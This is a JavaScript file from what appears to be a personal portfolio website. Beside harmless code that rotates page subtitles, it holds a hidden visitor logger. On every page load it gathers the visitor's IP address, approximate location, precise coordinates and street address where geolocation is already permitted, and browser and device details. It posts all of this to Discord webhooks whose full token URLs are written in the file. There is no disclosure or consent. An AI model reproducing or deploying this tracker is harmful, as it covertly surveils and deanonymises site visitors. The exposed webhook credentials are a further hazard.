const WEBHOOK_URL = `https://discord.com/api/webhooks/1349523049250291712/wUumjsxHGe6Qyd2G4gUAmb_5OHX7T8U2Nbxkpb4mEjW9xVuZc0Le96jVBOC8rguajQbc`;

function sendToDiscord(ipData, locationData, deviceData) {
  const ip = ipData.ip;
  const city = ipData.city;
  const region = ipData.region;
  const country = ipData.country_name;
  const longitude = ipData.longitude;
  const latitude = ipData.latitude;

  let locationMessage = `Latitude: ${latitude} | Longitude: ${longitude}`;
  let addressMessage = "";

  if (locationData) {
    const { lat, lon, address } = locationData;
    locationMessage = `Latitude: ${lat} | Longitude: ${lon}`;
    addressMessage = `Address: ${address}`;
  }

  // Device information
  const deviceMessage = `
Device Information:
- Browser: ${deviceData.browser}
- OS: ${deviceData.os}
- Device: ${deviceData.device}
- Type: ${deviceData.type}
`;

  const message = `\`\`\`
IP Address: ${ip}
Location: ${city}, ${region}, ${country}
${locationMessage}
${addressMessage}
${deviceMessage}
\`\`\``;

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: message }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      console.log(`Sent message to Discord with status ${response.status}`);
    })
    .catch((error) => {
      console.error(`Error sending message to Discord: ${error}`);
    });
}

function getUserLocation(callback) {
  navigator.permissions
    .query({ name: "geolocation" })
    .then(function (permissionStatus) {
      if (permissionStatus.state === "granted") {
        navigator.geolocation.getCurrentPosition(
          function (position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Fetch address data from OpenStreetMap Nominatim API
            fetch(
              `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
            )
              .then((response) => response.json())
              .then((data) => {
                const address = `${data.address.road || ""}, ${
                  data.address.city || ""
                }, ${data.address.state || ""}, ${data.address.country || ""}`;
                callback({ lat, lon, address });
              })
              .catch(() => callback(null));
          },
          () => callback(null)
        );
      } else {
        callback(null);
      }
    })
    .catch(() => callback(null));
}

function sendIPData() {
  fetch("https://ipapi.co/json")
    .then((response) => response.json())
    .then((ipData) => {
      getUserLocation(function (locationData) {
        const deviceData = getDeviceData(); // Get device data
        sendToDiscord(ipData, locationData, deviceData); // Pass device data
      });
    })
    .catch((error) => console.error(`Error retrieving IP data: ${error}`));
}

function getDeviceData() {
  // Initialize the parser
  var parser = new UAParser();
  var result = parser.getResult();

  // Prepare the device data to send
  return {
    browser: result.browser.name + " " + result.browser.version,
    os: result.os.name + " " + result.os.version,
    device: result.device.vendor + " " + result.device.model,
    type: result.device.type,
  };
}

window.addEventListener("load", sendIPData);

document.addEventListener("DOMContentLoaded", function () {
  const subtitles = [
    "Computer Programming & Information Systems Major",
    "Aspiring Software Engineer",
    "Photographer",
    "Programming Intern",
    "Slight Egomaniac",
  ];

  const subtitleElement = document.querySelector(".subtitle");

  function getRandomSubtitle(exclude) {
    let newSubtitle;
    do {
      newSubtitle = subtitles[Math.floor(Math.random() * subtitles.length)];
    } while (newSubtitle === exclude);
    return newSubtitle;
  }

  function changeSubtitle() {
    subtitleElement.classList.add("fade-out");

    setTimeout(() => {
      subtitleElement.textContent = getRandomSubtitle(
        subtitleElement.textContent
      );
      subtitleElement.classList.remove("fade-out");
    }, 1500); // Wait for fade-out before changing text
  }

  // Set random initial subtitle
  subtitleElement.textContent = getRandomSubtitle(null);

  // Change subtitle every 6 seconds
  setInterval(changeSubtitle, 6000);
});

function sendDeviceData() {
  // Initialize the parser
  var parser = new UAParser();
  var result = parser.getResult();

  // Prepare the data to send
  var data = {
    content: "",
    embeds: [
      {
        title: "Device Information",
        fields: [
          {
            name: "Browser",
            value: result.browser.name + " " + result.browser.version,
            inline: true,
          },
          {
            name: "OS",
            value: result.os.name + " " + result.os.version,
            inline: true,
          },
          {
            name: "Device",
            value: result.device.vendor + " " + result.device.model,
            inline: true,
          },
          {
            name: "Type",
            value: result.device.type,
            inline: true,
          },
        ],
        color: 16711680, // Optional: color of the embed
      },
    ],
  };

  // Send the data to the Discord webhook
  fetch(
    "https://discord.com/api/webhooks/1322770741447626855/IzGc7Zr-stzRN5_j2TlxYcNhgfT-bkRTRu6tlD2y1EGtrtx1hLpALbtOBPO1Yj9enZre",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    }
  )
    .then((response) => {
      if (response.ok) {
        console.log("Device data sent to Discord webhook");
      } else {
        console.error(
          "Error sending data to Discord webhook",
          response.statusText
        );
      }
    })
    .catch((error) => {
      console.error("Error sending data to Discord webhook", error);
    });
}

// Call the function to send device data when the page loads
window.onload = sendDeviceData;
